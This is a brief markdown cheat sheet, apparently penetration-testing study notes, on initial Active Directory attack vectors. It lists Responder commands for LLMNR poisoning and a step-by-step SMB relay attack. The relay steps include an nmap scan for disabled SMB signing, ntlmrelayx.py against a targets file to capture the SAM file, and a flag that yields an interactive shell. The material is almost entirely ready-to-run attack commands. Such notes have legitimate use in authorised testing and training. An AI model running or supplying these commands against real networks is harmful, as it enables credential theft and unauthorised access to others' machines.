# Initial Attack Vectors

## LLMNR Poisoning
- `responder -I <INTERFACE_NAME> -dwv`


## SMB Relay

#### Prerequisite
- smb signing must be disabled on the target (by default is disable on client windows and enable on server windows)
- relayed user credentials must be admin on target machine

#### Check if smb signing is off on the targets:
- `nmap --script=smb2-security-mode.nse -p445 192.168.189.0/24`

#### Steps for this attack:
1. edit `responder.conf` and turn off smb and http services
2. run responder : `responder -I <INTERFACE_NAME> -dwv`
3. Put targets ip address in targets.txt file
4. run `ntlmrelayx.py -tf targets.txt -smb2support`
5. it will capture SAM file of the target machine

- Note : using `-i` with `ntlmrelayx.py` will give an interactive shell
